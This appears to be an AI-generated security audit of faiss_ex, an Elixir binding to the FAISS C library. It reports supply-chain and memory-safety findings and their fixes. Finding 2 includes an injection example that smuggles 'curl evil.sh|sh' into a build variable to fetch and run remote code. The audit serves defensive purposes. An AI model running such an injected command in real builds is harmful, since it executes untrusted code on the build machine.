# Security Audit: faiss_ex (native NIF + supply chain)

## Executive Summary

This is a native-code C NIF binding for FAISS with no web/auth/session layer,
so OWASP web categories do not apply. Audit focused on memory safety of
`c_src/faiss_ex_nif.c`, the Elixir boundary, and the build supply chain.

**The C NIF layer is exemplary**: every size product goes through overflow-safe
`safe_mul`, every binary size is validated against claimed `n * dim` before the
pointer reaches FAISS, all allocation failures are handled, error paths release
locks and binaries, interior-NUL strings are rejected, no dynamic atoms, no
format strings, and resource destructors are guarded against double-free. No
memory-safety bug was found in the NIF.

The real weaknesses are in the **build supply chain**: FAISS is pulled from a
**mutable git tag with no commit-SHA pin or checksum verification**.

**Security health score: 85/100** — memory-safe, lock-disciplined native code;
points deducted for an unpinned/unverified upstream source fetch (supply chain)
and build-time shell-interpolation of env vars.

## Findings

### 1. FAISS pulled from mutable git tag, no SHA/checksum verification (Supply Chain)
- **Severity**: Medium
- **Location**: `Makefile:11,140`; `mix.exs:72`
- **Issue**: `FAISS_GIT_REV ?= v1.14.3` is a **tag**, which is mutable. The build
  does `git clone --depth 1 --branch v1.14.3 <repo>` and compiles whatever the
  tag points to at build time. There is no commit-SHA pin and no verification of
  the cloned tree against a known hash. Git tags can be force-moved on the remote,
  and `--depth 1 --branch <tag>` will silently fetch the new target.
- **Failure scenario**: If the `facebookresearch/faiss` `v1.14.3` tag is moved
  (upstream compromise, or a maintainer re-tag), every fresh `mix compile`
  (cache miss at `~/.cache/faiss_ex/`) compiles and links attacker-controlled C++
  into the BEAM with zero warning. There is no integrity gate to detect the change.
- **Fix**: Pin to an immutable commit SHA and verify it, e.g.:
  ```make
  FAISS_GIT_REV ?= <full-40-char-sha>
  # after clone:
  cd $(FAISS_SRC) && test "$$(git rev-parse HEAD)" = "$(FAISS_EXPECTED_SHA)"
  ```
  Clone without `--branch` on a shallow tag, then `git fetch --depth 1 origin <sha>`
  and `git checkout <sha>`. Keep the human-readable tag only as a comment.
- **OWASP**: A08:2021 Software and Data Integrity Failures.

### 2. Build-time shell interpolation of env vars (Supply Chain / defense-in-depth)
- **Severity**: Low
- **Location**: `Makefile:140` (`git clone ... $(FAISS_GIT_REV) $(FAISS_GIT_REPO)`),
  and the `FAISS_PREFIX` `cp`/`install_name_tool` recipes (`Makefile:110-124`).
- **Issue**: `FAISS_GIT_REV`, `FAISS_GIT_REPO`, and `FAISS_PREFIX` (all env-overridable
  via `mix.exs` `make_env/0`) are interpolated unquoted into shell recipe lines. A
  value containing shell metacharacters would execute during `mix compile`.
- **Failure scenario**: `FAISS_GIT_REV='v1; curl evil.sh|sh' mix compile` runs
  arbitrary commands. Requires an attacker who already controls the build
  environment (env vars / CI config), so impact is limited — but a poisoned CI
  variable or a copy-pasted build command turns into code execution.
- **Fix**: Quote expansions (`"$(FAISS_GIT_REV)"`) and/or validate the values
  match `^[A-Za-z0-9._/-]+$` before use. Prefer passing the repo/rev as fixed
  literals rather than overridable env vars for release builds.

### 3. Unbounded result allocation from caller-controlled n / k (DoS)
- **Severity**: Low (informational — memory-safe, not a crash)
- **Location**: `nif_search_index` `c_src/faiss_ex_nif.c:361-378`; also
  reconstruct/residuals result buffers.
- **Issue**: Result binaries are sized `n * k * 8` (labels) + `n * k * 4`
  (distances) from caller-supplied `n` and `k`. `safe_mul` prevents integer
  overflow and `enif_alloc_binary` failure is handled gracefully, so there is no
  memory-unsafety — but a single `search(index, huge_batch, huge_k)` can request
  a very large allocation.
- **Failure scenario**: A caller passing an enormous `k` triggers a large
  transient allocation / allocation failure. In a library context the caller
  controls its own inputs, so this is informational; document that `k` and batch
  size should be bounded by callers exposing faiss_ex to untrusted input.
- **Fix**: Optionally cap `n * k` (e.g. reject > configurable limit) if this
  library is ever placed behind untrusted request input.

### 4. NIF trusts FAISS to bounds-check reconstruct keys (informational)
- **Severity**: Low (informational)
- **Location**: `nif_reconstruct_batch` `c_src/faiss_ex_nif.c:485-524`.
- **Issue**: `keys[]` values (including negative or out-of-range) are passed to
  `faiss_Index_reconstruct[_n]` without a ntotal bounds check in the NIF. FAISS
  1.14.3 validates (`FAISS_THROW_IF_NOT(i0 >= 0 && i0 + ni <= ntotal)`) and the
  C API converts the throw to a non-zero return that the NIF handles, so this is
  currently safe. It is a correctness dependency on upstream, not a live bug.
- **Fix**: None required for 1.14.3. Re-verify the reconstruct bounds guards when
  bumping `FAISS_GIT_REV` (same note as the thread-local `faiss_get_last_error`
  assumption already documented at line 122).

## Clean areas (no issues found)
- Integer overflow in size products: `safe_mul` used at every product; overflow
  returns an error before allocation.
- Binary size validation: every NIF checks `data_bin.size == expected` before
  passing the pointer to FAISS.
- Buffer over/under-read on binary slicing: sizes validated; `n==0` paths guard
  empty binaries.
- Use-after-free / double-free in destructors: destructors NULL out after free;
  the GPU/wrap error paths do not double-free (verified `nif_index_cpu_to_gpu`).
- Resource-vs-destructor race: resources are NIF call arguments, so the BEAM keeps
  them alive for the call duration; rwlock discipline (write for mutate, read for
  query; fixed two-lock order in `nif_train_clustering`) is correct and all
  lockable NIFs run on dirty schedulers.
- Error paths leaking memory/locks: every early return after `rwlock`/`enif_alloc`
  releases the lock and any allocated binary.
- Format-string issues: none — `make_error_msg` uses `memcpy`+`strlen`, no `printf`
  family with user data.
- Atom exhaustion: only four fixed atoms created in `init_atoms`; no dynamic atoms.
- Interior-NUL / path handling: `contains_nul` rejects embedded NULs in factory
  strings and file paths before null-termination. Caller-controlled file paths are
  expected for a library; no path-traversal bug to flag.
- Elixir layer: no `String.to_atom`, no `:erlang.binary_to_term`, no `System.cmd`/
  `Code.eval`/`apply` on external input (grep clean across `lib/`). Input is
  encoded to f32/s64 binaries with per-row dimension validation in
  `Shared.encode_vectors!` (raises `ArgumentError` on bad rows).

## Tools to Recommend (run manually — this agent has no Bash access)
- `mix deps.audit` / `mix hex.audit` — dependency advisories (deps are minimal:
  `elixir_make`, `ex_doc`, `benchee`).
- `sobelow` is Phoenix-oriented and will find little here; skip.
- Consider `clang --analyze` / `scan-build` and an ASan build of the NIF against
  a fuzz harness feeding malformed `n`/`dim`/binary combinations to each NIF.
